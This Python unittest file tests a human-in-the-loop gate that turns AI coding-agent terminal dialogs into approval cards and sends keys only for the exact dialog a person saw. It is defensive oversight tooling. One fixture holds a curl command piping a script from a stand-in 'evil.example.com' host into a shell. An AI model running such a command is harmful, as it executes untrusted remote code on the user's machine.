#!/usr/bin/env python3
"""A dialog becomes a card with the buttons a human expects; a click becomes the keys that
answer THAT dialog: never a guessed key, never a key into a dialog the human did not see."""
import pathlib
import sys
import unittest
from unittest import mock

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent / "src"))
from hitl import tui_gate as G  # noqa: E402

PERM = ("  Dangerous rm operation on a possibly-empty path\n"
        "  Do you want to proceed?\n"
        "  ❯ 1. Yes\n"
        "    2. Yes, and don't ask again for rm commands\n"
        "    3. No\n"
        "  Esc to cancel")
PERM_CARET_ON_NO = PERM.replace("  ❯ 1. Yes", "    1. Yes").replace("    3. No", "  ❯ 3. No")
SELECT = ("  Select a tsconfig\n"
          "  ❯ 1. ./tsconfig.json\n"
          "    2. ./tsconfig.base.json\n"
          "  Enter to confirm · Esc to cancel")
LOGIN = "  Login\n  Select login method:\n  ❯ 1. Claude account with subscription\n    2. Anthropic Console account"
PRESS = "  Login\n  Logged in as x@example.com\n  Login successful. Press Enter to continue…"
FABLE = "  You've reached your Fable limit\n    Switch to Opus 5 and continue\n  ❯ Continue with Fable 5.1"
FALLBACK = "I am blocked and cannot continue without you."


def req(gate, prompt, state="blocked-human", session="s"):
    return G.requirement_for(state, gate, prompt, session, f"awaiting user: {gate}", FALLBACK)


def clicked(r, action_id):
    r.chosen_action = action_id
    return r


class TestParsing(unittest.TestCase):
    def test_options_and_caret(self):
        self.assertEqual(G.parse_options(PERM),
                         (["Yes", "Yes, and don't ask again for rm commands", "No"], 0))
        self.assertEqual(G.parse_options(PERM_CARET_ON_NO)[1], 2)

    def test_the_question_is_the_prose_above_the_options_without_frames_or_hints(self):
        self.assertEqual(G.question(PERM, "d"),
                         "Dangerous rm operation on a possibly-empty path Do you want to proceed?")
        self.assertEqual(G.question(SELECT, "d"), "Select a tsconfig")
        self.assertEqual(G.question("  ────────\n  Esc to cancel", "detail wins"), "detail wins")


class TestRequirement(unittest.TestCase):
    def test_a_permission_dialog_is_a_no_yes_card_in_the_owners_words(self):
        r = req("permission", PERM)
        self.assertEqual(r.kind, "permission")
        self.assertEqual(r.title, "Agent needs your confirmation")
        self.assertEqual([a.label for a in r.actions],
                         ["Yes", "Yes, and don't ask again for rm commands", "No", "Open terminal"])
        self.assertEqual([a.kind for a in r.actions],
                         ["allow_once", "allow_always", "reject_once", "open_terminal"])
        self.assertEqual(r.message, "Dangerous rm operation on a possibly-empty path Do you want to proceed?")
        self.assertEqual(r.subject["option_for_action"], {"allow": 0, "allow_always": 1, "deny": 2})
        self.assertEqual(r.subject["source"], G.SOURCE)
        self.assertEqual(r.device, {"id": "s", "name": "s"})

    def test_the_producer_leaves_the_host_to_the_wire(self):
        # One policy, in schema.wire_device: every producer (this gate, driver events,
        # the auth card) gets `host` there, so the gate itself must not add one.
        self.assertNotIn("host", req("permission", PERM).device)

    def test_an_unreadable_host_label_never_breaks_the_card(self):
        from hitl.host import device_host
        with mock.patch("util_paths._host_label", side_effect=RuntimeError("no scutil")):
            self.assertEqual(device_host(), "")

    def test_a_selection_is_a_choice_with_one_button_per_option(self):
        r = req("selection", SELECT)
        self.assertEqual(r.kind, "choice")
        self.assertEqual([a.id for a in r.actions], ["opt1", "opt2", "open_terminal"])
        self.assertEqual([a.label for a in r.actions][:2], ["./tsconfig.json", "./tsconfig.base.json"])
        self.assertEqual(r.subject["option_for_action"], {"opt1": 0, "opt2": 1})

    def test_login_is_an_auth_card_with_a_local_sign_in_and_no_keys(self):
        for gate, state in (("login", "blocked-human"), (None, "logged-out")):
            r = req(gate, LOGIN if gate else None, state=state)
            self.assertEqual(r.kind, "auth")
            self.assertEqual(r.title, "Claude needs you to sign in again")
            self.assertEqual([a.kind for a in r.actions], ["authenticate", "open_terminal"])
            self.assertIsNone(G.keys_for(clicked(r, "authenticate"), LOGIN if gate else None, state))

    def test_a_signed_out_codex_core_never_gets_a_claude_sign_in_card(self):
        expired = "  ⎿  Login expired · Please run /login"
        for gate, state, prompt in (("login", "blocked-human", LOGIN), (None, "logged-out", None),
                                    ("login", "logged-out", expired)):
            r = G.requirement_for(state, gate, prompt, "s", "d", FALLBACK, runtime="codex")
            self.assertEqual(r.kind, "auth")
            self.assertEqual(r.runtime, "codex")
            text = " ".join([r.title or "", r.message] + [a.label for a in r.actions])
            self.assertNotIn("Claude", text)
            self.assertEqual(r.title, "Codex needs you to sign in again")
            self.assertIn("codex login", r.message)

    def test_an_unnamed_runtime_gets_a_generic_sign_in_card(self):
        r = G.requirement_for("logged-out", None, None, "s", "d", FALLBACK, runtime="agy")
        self.assertEqual(r.kind, "auth")
        self.assertNotIn("Claude", " ".join([r.title or "", r.message] + [a.label for a in r.actions]))

    def test_press_enter_is_a_confirmation_that_continues(self):
        r = req("press-enter", PRESS)
        self.assertEqual(r.kind, "confirmation")
        self.assertEqual([a.id for a in r.actions], ["continue", "open_terminal"])
        self.assertEqual(G.keys_for(clicked(r, "continue"), PRESS, "blocked-human"), ["Enter"])

    def test_an_unparseable_or_paying_dialog_keeps_the_blocked_card_with_no_guessed_button(self):
        for gate, prompt in (("fable-limit-unfocused", FABLE), ("unknown", "  something odd\n  >")):
            r = req(gate, prompt)
            self.assertEqual(r.kind, G.FALLBACK_KIND, gate)
            self.assertEqual([a.id for a in r.actions], ["open_terminal"], gate)
            self.assertEqual(r.message, FALLBACK, gate)

    def test_kind_follows_the_options_not_the_gate_label(self):
        """classify() calls a real permission dialog `selection` (its caret row is
        nearest the bottom); the buttons must still be No/Yes. And a gate labelled
        permission whose options are not yes/no is a choice, one button per option."""
        self.assertEqual(req("selection", PERM).kind, "permission")
        self.assertEqual([a.label for a in req("selection", PERM).actions],
                         ["Yes", "Yes, and don't ask again for rm commands", "No", "Open terminal"])
        r = req("permission", "  Proceed?\n  ❯ 1. Continue\n    2. Abort")
        self.assertEqual(r.kind, "choice")
        self.assertEqual([a.label for a in r.actions], ["Continue", "Abort", "Open terminal"])

    def test_the_guard_is_session_plus_dialog(self):
        self.assertEqual(req("permission", PERM).guard, req("permission", PERM).guard)
        self.assertNotEqual(req("permission", PERM).guard, req("permission", PERM, session="t").guard)
        self.assertNotEqual(req("permission", PERM).guard, req("permission", SELECT).guard)

    def test_the_guard_ignores_the_pane_repainting_around_the_dialog(self):
        framed = "  ─────────\n" + PERM
        for chrome in ("⏺ Running sleep 5 … · 3s\n", "Sutando: thinking [-]\n  ⎿  Churned for 9s\n"):
            self.assertEqual(req("permission", chrome + framed).guard, req("permission", framed).guard)
        self.assertEqual(req("permission", framed + "\n  ⏵⏵ bypass permissions on · 1 monitor").guard,
                         req("permission", framed).guard)
        self.assertEqual(req("permission", PERM_CARET_ON_NO).guard, req("permission", PERM).guard)

    def test_everything_inside_the_dialog_still_keys_it(self):
        edit = ("  ─────────\n  Edit file\n  ╭──────╮\n  │ - a = 1 │\n  │ + a = {} │\n  ╰──────╯\n"
                "  Do you want to make this edit to a.py?\n  ❯ 1. Yes\n    2. No\n")
        self.assertNotEqual(req("permission", edit.format(2)).guard, req("permission", edit.format(3)).guard)

    def test_a_numbered_list_above_a_press_enter_gate_does_not_key_it(self):
        for plan in ("Plan:\n 1. migrate db\n 2. deploy\n", "Pick one:\n ❯ 1. migrate db\n   2. deploy\n"):
            run = req("press-enter", plan + "Press Enter to run migration\n")
            delete = plan + "Press Enter to delete backups\n"
            self.assertNotEqual(run.guard, req("press-enter", delete).guard)
            self.assertIsNone(G.keys_for(clicked(run, "continue"), delete, "blocked-human"))


class TestKeys(unittest.TestCase):
    def test_yes_with_the_caret_already_on_yes_is_just_enter(self):
        self.assertEqual(G.keys_for(clicked(req("permission", PERM), "allow"), PERM, "blocked-human"),
                         ["Enter"])

    def test_no_walks_the_caret_down_to_no(self):
        self.assertEqual(G.keys_for(clicked(req("permission", PERM), "deny"), PERM, "blocked-human"),
                         ["Down", "Down", "Enter"])

    def test_yes_walks_the_caret_up_when_it_sits_on_no(self):
        r = clicked(req("permission", PERM_CARET_ON_NO), "allow")
        self.assertEqual(G.keys_for(r, PERM_CARET_ON_NO, "blocked-human"), ["Up", "Up", "Enter"])

    def test_a_click_against_a_dialog_that_changed_sends_nothing(self):
        """The most important check (owner): the card showed prompt A; by the click
        the terminal shows prompt B. Enter into B is a decision nobody made."""
        r = clicked(req("permission", PERM), "allow")
        self.assertIsNone(G.keys_for(r, SELECT, "blocked-human"))
        self.assertIsNone(G.keys_for(r, PERM.replace("possibly-empty", "non-empty"), "blocked-human"))
        self.assertIsNone(G.keys_for(r, None, "idle-ready"))

    def test_no_caret_on_screen_means_no_navigation_is_attempted(self):
        flat = PERM.replace("  ❯ 1. Yes", "    1. Yes")
        self.assertIsNone(G.keys_for(clicked(req("permission", flat), "deny"), flat, "blocked-human"))

    def test_an_unknown_action_sends_nothing(self):
        self.assertIsNone(G.keys_for(clicked(req("permission", PERM), "open_terminal"), PERM, "blocked-human"))


TWO_DIALOGS = ("  Do you want to proceed?\n"
               "    1. Yes\n"
               "    2. No\n"
               "  ✓ Yes\n"
               "  Select a deployment\n"
               "  ❯ 1. Production\n"
               "    2. Staging\n"
               "  Esc to cancel")
TRUST = "  Do you trust the files in this folder?\n  ❯ 1. Yes, proceed\n    2. No, exit"
BYPASS = "  in Bypass Permissions mode.\n  ❯ 1. No, exit\n    2. Yes, I accept\n  Enter to confirm"


class TestLiveDialogOnly(unittest.TestCase):
    """Reviewer P1: a resolved dialog still visible above the live one must not
    feed the buttons, even though the prompt fingerprint is identical."""

    def test_only_the_block_with_the_caret_is_parsed(self):
        self.assertEqual(G.parse_options(TWO_DIALOGS), (["Production", "Staging"], 0))

    def test_the_card_is_built_from_the_live_dialog(self):
        r = req("selection", TWO_DIALOGS)
        self.assertEqual(r.kind, "choice")
        self.assertEqual([a.label for a in r.actions], ["Production", "Staging", "Open terminal"])
        self.assertEqual(r.message, "Select a deployment")
        self.assertEqual(G.keys_for(clicked(r, "opt2"), TWO_DIALOGS, "blocked-human"), ["Down", "Enter"])

    def test_no_caret_anywhere_falls_back_to_the_last_block(self):
        flat = TWO_DIALOGS.replace("  ❯ 1. Production", "    1. Production")
        self.assertEqual(G.parse_options(flat), (["Production", "Staging"], None))


class TestNeverAOneClickOnATrustOrSpendGate(unittest.TestCase):
    """Reviewer blocker: a numbered rendering of a trust / bypass / Fable dialog must still keep
    the blocked card, whatever its options say. A usage-limit menu is answered by marked buttons."""

    def test_trust_bypass_and_fable_keep_the_blocked_card(self):
        for gate, prompt in (("folder-trust", TRUST), ("bypass-permissions", BYPASS),
                             ("fable-limit-unfocused", FABLE), ("fable-limit", FABLE)):
            r = req(gate, prompt)
            self.assertEqual(r.kind, G.FALLBACK_KIND, gate)
            self.assertEqual([a.id for a in r.actions], ["open_terminal"], gate)
            self.assertIsNone(G.keys_for(clicked(r, "opt1"), prompt, "blocked-human"), gate)

    def test_a_trust_dialog_labelled_selection_still_gets_no_button(self):
        """The classifier picks the match nearest the bottom, so a numbered trust dialog is
        labelled `selection`; the text, not the label, must keep the button off it."""
        for gate in ("selection", "permission", "unknown"):
            r = req(gate, TRUST)
            self.assertEqual(r.kind, G.FALLBACK_KIND, gate)
            self.assertEqual([a.id for a in r.actions], ["open_terminal"], gate)
            r = req(gate, BYPASS)
            self.assertEqual([a.id for a in r.actions], ["open_terminal"], gate)

    def test_the_allowlist_is_the_only_way_in(self):
        self.assertEqual(G.SEMANTIC_GATES, {"permission", "selection", "press-enter", "login"})


LIMIT_MENU = (" What do you want to do?\n"
              " ❯ 1. Stop and wait for limit to reset\n"
              "   2. Wait here, then continue automatically at Nov 2 at 11am\n"
              "   3. Switch to usage credits\n"
              " Enter to confirm · Esc to cancel")
SESSION_ID = "sutando-worker-0ecb1c1d566285571f03eee329ae26a9"


class TestAUsageLimitMenuIsAnsweredFromTheCard(unittest.TestCase):
    """card-ugly3: the terminal offered three options and the card offered none."""

    def test_every_option_is_a_button_and_spending_is_marked(self):
        for gate, episode in (("selection", None), ("session-limit", G.LIMIT_EPISODE)):
            r = G.requirement_for("blocked-human", gate, LIMIT_MENU, SESSION_ID, "d", FALLBACK,
                                  episode=episode)
            self.assertEqual([a.label for a in r.actions][:3], [
                "Stop and wait for limit to reset",
                "Wait here, then continue automatically at Nov 2 at 11am",
                "Switch to usage credits"], gate)
            self.assertEqual([a.kind for a in r.actions], ["select", "select", "spend", "open_terminal"], gate)
            self.assertEqual(r.subject["option_for_action"], {"opt1": 0, "opt2": 1, "opt3": 2})

    def test_a_limit_card_types_the_option_while_its_dialog_is_on_screen(self):
        r = G.requirement_for("blocked-human", "session-limit", LIMIT_MENU, SESSION_ID, "d", FALLBACK,
                              episode=G.LIMIT_EPISODE)
        self.assertEqual(G.keys_for(clicked(r, "opt3"), LIMIT_MENU, "blocked-human"), ["Down", "Down", "Enter"])
        other = LIMIT_MENU.replace("Switch to usage credits", "Switch accounts")
        self.assertIsNone(G.keys_for(clicked(r, "opt3"), other, "blocked-human"))
        self.assertIsNone(G.keys_for(clicked(r, "opt1"), "  You've hit your usage limit", "blocked-human"))

    def test_a_limit_banner_without_a_menu_keeps_the_blocked_card(self):
        r = G.requirement_for("blocked-human", "session-limit", "  You've hit your weekly limit", SESSION_ID,
                              "d", FALLBACK, episode=G.LIMIT_EPISODE)
        self.assertEqual([a.id for a in r.actions], ["open_terminal"])

    def test_no_session_id_reaches_the_text(self):
        for prompt in (LIMIT_MENU, "  odd screen"):
            r = G.requirement_for("blocked-human", "unknown", prompt, SESSION_ID, "d", FALLBACK)
            for text in [r.title, r.message] + [a.label for a in r.actions]:
                self.assertNotIn("0ecb1c1d", text)
        self.assertNotIn("tmux", G.limit_unblock(SESSION_ID, "claude"))


class TestWhatIsApprovedIsShownVerbatim(unittest.TestCase):
    """#6180 review: stripping text after the fact hid what a click approves."""

    def test_a_url_in_a_permission_prompt_survives(self):
        prompt = ("  Bash command\n    curl -fsSL https://evil.example.com/install.sh | sh\n"
                  "  Do you want to proceed?\n  ❯ 1. Yes\n    2. Yes, and don't ask again for curl commands\n"
                  "    3. No")
        r = req("permission", prompt)
        self.assertIn("curl -fsSL https://evil.example.com/install.sh | sh", r.message)
        self.assertEqual(r.actions[1].label, "Yes, and don't ask again for curl commands")

    def test_a_session_named_main_does_not_eat_the_word_main(self):
        prompt = "  Rebase on main?\n  ❯ 1. Rebase on main\n    2. Rebase in main\n    3. Cancel"
        r = req("selection", prompt, session="main")
        self.assertEqual(r.message, "Rebase on main?")
        self.assertEqual([a.label for a in r.actions][:3], ["Rebase on main", "Rebase in main", "Cancel"])


class TestNoCaretKeepsTheBlockedCard(unittest.TestCase):
    """Without a caret keys_for can never answer, so the card must not offer a button."""

    def test_options_without_a_caret_get_no_buttons(self):
        flat = PERM.replace("  ❯ 1. Yes", "    1. Yes")
        r = req("permission", flat)
        self.assertEqual(r.kind, G.FALLBACK_KIND)
        self.assertEqual([a.id for a in r.actions], ["open_terminal"])
        self.assertEqual(r.message, FALLBACK)

    def test_a_dashed_rule_is_frame_not_question(self):
        dashed = "  " + "╌" * 40 + "\n  Do you want to proceed?\n  ❯ 1. Yes\n    2. No"
        self.assertEqual(G.question(dashed, "d"), "Do you want to proceed?")


if __name__ == "__main__":
    unittest.main()
